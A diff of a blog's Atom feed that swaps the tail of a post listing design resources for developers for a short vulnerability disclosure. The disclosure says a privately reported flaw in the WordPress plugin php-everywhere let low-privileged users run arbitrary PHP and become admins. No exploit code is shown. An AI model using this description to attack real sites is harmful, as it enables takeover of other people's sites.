-<p>Reading about principles &amp; concepts is great but may feel abstract. 
-Seeing finished products where these principles are applied helps tie 
-the concepts together.</p>
-
-<ul>
-  <li>http://www.awwwards.com/websites</li>
-  <li>pttrns.com</li>
-  <li>http://littlebigdetails.com/</li>
-  <li>https://material.uplabs.com/</li>
-  <li>http://beta.uihaus.com/</li>
-  <li>https://www.uplabs.com/</li>
-</ul>
-
-<h2 id="tutorials">Tutorials</h2>
-<ul>
-  <li>https://tutsplus.com/</li>
-  <li>https://teamtreehouse.com/tracks/web-design</li>
-  <li>https://www.coursera.org/browse/computer-science/design-and-product?languages=en</li>
-</ul>
-
-<h2 id="books">Books</h2>
-<ul>
-  <li>https://www.amazon.com/Things-Designer-People-Voices-Matter/dp/0321767535</li>
-  <li>https://www.amazon.com/Dont-Make-Think-Revisited-Usability/dp/0321965515/ref=pd_sbs_14_img_0?_encoding=UTF8&amp;psc=1&amp;refRID=KSRVRJR3RBHD00H7TVQD</li>
-  <li>https://www.amazon.com/Designing-Mind-Simple-Understanding-Interface/dp/012375030X/</li>
-</ul>]]></content><author><name></name></author><category term="craftmanship" /><category term="design" /><category term="raw" /><summary type="html"><![CDATA[As a developer, it is beneficial to understand basics of design and how people digest information. You may think to yourself that you will never have to create a visual interface, but the reality is even code has a visual aspect which has impact on its consumption. A deeper understanding of visual perception can positively impact your code! Principles Design is a mature industry with centuries of application and study. There are many tried and true principles and concepts that you should apply and keep in mind when creating designs. Also understanding the elements of design and how they relate together allows you to put the pieces together in a cohesive fashion http://www.johnlovett.com/test.htm http://visual.ly/6-principles-design http://learndesignprinciples.com/ http://www.creativebloq.com/graphic-design/gestalt-theory-10134960 http://graphicdesign.spokanefalls.edu/tutorials/process/gestaltprinciples/gestaltprinc.htm http://lifehacker.com/5739492/learn-the-basics-of-design-this-weekend http://justcreative.com/2008/06/13/how-to-design-learn-the-basics/ Typography A vast amount of information that is communicated is in the form of text. The visual form of this text affects how the information presented is consumed. If letters are very too close together or too far apart, reading can be hindered. If margin between lines of text is too big, discerning if information belongs together can become difficult. Typography is about addressing these sorts of problems with text and presenting text in a legible readable format. http://tangledindesign.com/5-basic-principles-you-must-consider-to-master-the-art-of-typography/ https://www.smashingmagazine.com/2009/03/10-principles-for-readable-web-typography/ Layouts TODO Links There are a number of resources to help developer types understand basics of design. I’ve also included articles that cover the the concept of information hierarchy, which is very important tool for aiding the digestion of information. https://blog.prototypr.io/design-for-programmers-d38c56982cd0 https://hackdesign.org/lessons https://webdesign.tutsplus.com/articles/typography-basics-for-developers–webdesign-14025 http://www.slideshare.net/Wolfr/design-for-developersonlineversionlong/25-Examples_of_desirable_qualities_Fast https://realm.io/news/christopher-downer-design-101-for-developers/ https://www.smashingmagazine.com/2015/02/design-principles-dominance-focal-points-hierarchy/ https://thoughtbot.com/upcase/design-for-developers http://www.dadapixel.com/blog/2014/7/30/opinion-information-density-isnt-as-important-as-information-hierarchy https://www.smashingmagazine.com/2014/03/design-principles-visual-perception-and-the-principles-of-gestalt/ http://ui-patterns.com/ http://uxmag.com/ http://52weeksofux.com Showcases Reading about principles &amp; concepts is great but may feel abstract. Seeing finished products where these principles are applied helps tie the concepts together. http://www.awwwards.com/websites pttrns.com http://littlebigdetails.com/ https://material.uplabs.com/ http://beta.uihaus.com/ https://www.uplabs.com/ Tutorials https://tutsplus.com/ https://teamtreehouse.com/tracks/web-design https://www.coursera.org/browse/computer-science/design-and-product?languages=en Books https://www.amazon.com/Things-Designer-People-Voices-Matter/dp/0321767535 https://www.amazon.com/Dont-Make-Think-Revisited-Usability/dp/0321965515/ref=pd_sbs_14_img_0?_encoding=UTF8&amp;psc=1&amp;refRID=KSRVRJR3RBHD00H7TVQD https://www.amazon.com/Designing-Mind-Simple-Understanding-Interface/dp/012375030X/]]></summary></entry></feed>
+<p>I’d also like to mention, it is probably safer to make the default setting that only admins by default can execute PHP, not editors &amp; contributors.</p>]]></content><author><name></name></author><category term="security" /><category term="vulnerability" /><summary type="html"><![CDATA[This is a post I back dated to when I privately reported a vulnerability to the author of the php-everywhere plugin. I discovered a low privileged user could execute arbitrary PHP code and provided a POC where a low priv user could upgrade their permissions to admin. (The plugin is no longer available for downloadhttps://wordpress.org/plugins/php-everywhere/)]]></summary></entry></feed>
